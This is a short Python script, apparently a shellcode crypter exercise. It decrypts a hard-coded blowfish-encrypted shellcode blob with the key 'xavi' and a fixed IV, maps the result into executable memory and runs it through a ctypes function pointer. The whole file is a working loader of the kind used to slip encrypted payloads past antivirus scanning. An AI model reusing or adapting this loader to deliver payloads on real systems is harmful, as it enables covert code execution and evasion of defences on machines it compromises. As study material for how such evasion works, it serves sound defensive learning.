# Author: Xavi Beltran
# Date: 13/05/2019

# Modules
import blowfish
import mmap
import ctypes

# Shellcode encrypted
enc_scd = b'\x1fp\x8bq\x0e\xc2\x11|p\x83\x05\x9d\xf4\xc4Y\xf5\x16s\xf5:|+\xc5)\tqV\x84\xbe\xe8X\xc5'

# Decrypt process
cipher = blowfish.Cipher(b"xavi")
data_encrypted = enc_scd
iv = b'88888888'
data_decrypted = b"".join(cipher.decrypt_cbc(data_encrypted, iv))
print ('[+] Blowfish decryption finished:')
print (data_decrypted)

# Shellcode Execution
# We create a piece of executable memory in python and write our shell-code into this memory
mm = mmap.mmap(-1, len(data_decrypted), flags=mmap.MAP_SHARED | mmap.MAP_ANONYMOUS, prot=mmap.PROT_WRITE | mmap.PROT_READ | mmap.PROT_EXEC)
mm.write(data_decrypted)
# We obtain the address of the memory and create a C Function Pointer using ctypes and this address 
restype = ctypes.c_int64
argtypes = tuple()
ctypes_buffer = ctypes.c_int.from_buffer(mm)
function = ctypes.CFUNCTYPE(restype, *argtypes)(ctypes.addressof(ctypes_buffer))
function()
